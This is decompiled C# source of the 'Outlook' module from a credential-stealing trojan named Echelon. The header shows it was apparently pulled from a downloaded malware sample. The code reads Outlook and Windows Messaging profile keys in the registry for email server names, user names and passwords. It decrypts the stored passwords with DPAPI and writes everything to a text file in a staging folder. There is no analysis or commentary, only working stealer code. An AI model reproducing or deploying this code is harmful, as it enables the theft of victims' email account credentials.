// Decompiled with JetBrains decompiler
// Type: Echelon.Outlook
// Assembly: Echelon, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DAEC4C03-F667-4BBB-B546-ED8351172E13
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.MSIL.Coins.gen-d5a7c67747c1d8095b6fb6fef9f446b048a753bfda98e9cf19f265a6203e27cf.exe

using Microsoft.Win32;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace Echelon
{
  internal class Outlook
  {
    public static string OutlookDir = "\\EmailClients\\Outlook";

    public static void GrabOutlook(string Echelon_Dir)
    {
      string str = "";
      string[] strArray = new string[4]
      {
        "Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
        "Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
        "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
        "Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676"
      };
      string[] clients = new string[28]
      {
        "SMTP Email Address",
        "SMTP Server",
        "POP3 Server",
        "POP3 User Name",
        "SMTP User Name",
        "NNTP Email Address",
        "NNTP User Name",
        "NNTP Server",
        "IMAP Server",
        "IMAP User Name",
        "Email",
        "HTTP User",
        "HTTP Server URL",
        "POP3 User",
        "IMAP User",
        "HTTPMail User Name",
        "HTTPMail Server",
        "SMTP User",
        "POP3 Password2",
        "IMAP Password2",
        "NNTP Password2",
        "HTTPMail Password2",
        "SMTP Password2",
        "POP3 Password",
        "IMAP Password",
        "NNTP Password",
        "HTTPMail Password",
        "SMTP Password"
      };
      foreach (string path in strArray)
        str += Outlook.Get(path, clients);
      try
      {
        Directory.CreateDirectory(Echelon_Dir + Outlook.OutlookDir);
        File.WriteAllText(Echelon_Dir + Outlook.OutlookDir + "\\Outlook.txt", str + "\r\n");
      }
      catch
      {
      }
    }

    private static string Get(string path, string[] clients)
    {
      Regex regex1 = new Regex("^(?!:\\/\\/)([a-zA-Z0-9-_]+\\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\\.[a-zA-Z]{2,11}?$");
      Regex regex2 = new Regex("^([a-zA-Z0-9_\\-\\.]+)@([a-zA-Z0-9_\\-\\.]+)\\.([a-zA-Z]{2,5})$");
      string str = "";
      try
      {
        foreach (string client in clients)
        {
          try
          {
            object infoFromReg = Outlook.GetInfoFromReg(path, client);
            if (infoFromReg != null && client.Contains("Password") && !client.Contains("2"))
              str = str + client + ": " + Outlook.Decrypt((byte[]) infoFromReg) + "\r\n";
            else if (regex1.IsMatch(infoFromReg.ToString()) || regex2.IsMatch(infoFromReg.ToString()))
              str += string.Format("{0}: {1}\r\n", (object) client, infoFromReg);
            else
              str = str + client + ": " + Encoding.UTF8.GetString((byte[]) infoFromReg).Replace(Convert.ToChar(0).ToString(), "") + "\r\n";
          }
          catch
          {
          }
        }
        foreach (string subKeyName in Registry.CurrentUser.OpenSubKey(path, false).GetSubKeyNames())
          str += Outlook.Get(path + "\\" + subKeyName, clients);
      }
      catch
      {
      }
      return str;
    }

    public static object GetInfoFromReg(string path, string valueName)
    {
      object infoFromReg = (object) null;
      try
      {
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(path, false);
        infoFromReg = registryKey.GetValue(valueName);
        registryKey.Close();
      }
      catch
      {
      }
      return infoFromReg;
    }

    public static string Decrypt(byte[] encrypted)
    {
      try
      {
        byte[] numArray = new byte[encrypted.Length - 1];
        Buffer.BlockCopy((Array) encrypted, 1, (Array) numArray, 0, encrypted.Length - 1);
        return Encoding.UTF8.GetString(ProtectedData.Unprotect(numArray, (byte[]) null, DataProtectionScope.CurrentUser)).Replace(Convert.ToChar(0).ToString(), "");
      }
      catch
      {
      }
      return "null";
    }
  }
}
